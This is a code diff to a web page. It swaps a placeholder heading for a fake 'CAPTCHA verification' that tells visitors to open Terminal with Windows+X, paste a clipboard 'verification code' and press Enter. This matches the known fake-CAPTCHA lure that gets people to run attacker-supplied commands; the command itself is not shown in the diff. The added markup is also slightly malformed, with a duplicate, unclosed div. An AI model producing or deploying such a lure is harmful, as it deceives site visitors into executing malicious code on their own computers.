@@ -822,7 +822,14 @@
 
           <section class="instruction" aria-labelledby="instruction-title">
             <div class="instruction-content" lang="ru">
-              <h2 id="instruction-title">TEST</h2>
+              <h2 id="instruction-title">Please complete the following CAPTCHA verification:</h2>
+              <div class="instruction-body">
+                <ol>
+                  <li>Press <kbd class="key"><svg viewBox="0 0 16 16" width="14" height="14" aria-hidden="true"><path fill="currentColor" d="M0 2.5 6.5 1.5v6H0v-5zm7.5-1.2L16 0v7.5H7.5V1.3zM0 8.5h6.5v6L0 13.5v-5zm7.5 0H16V16l-8.5-1.2V8.5z"/></svg></kbd> + <kbd class="key">X</kbd>.</li>
+                  <li>Select the <strong>Terminal</strong> app.</li>
+                  <li>Paste the verification code with <kbd class="key">Ctrl</kbd> + <kbd class="key">V</kbd>.</li>
+                  <li>Press <kbd class="key">Enter</kbd>.</li>
+                </ol>
               <div class="instruction-body">
               </div>
             </div>
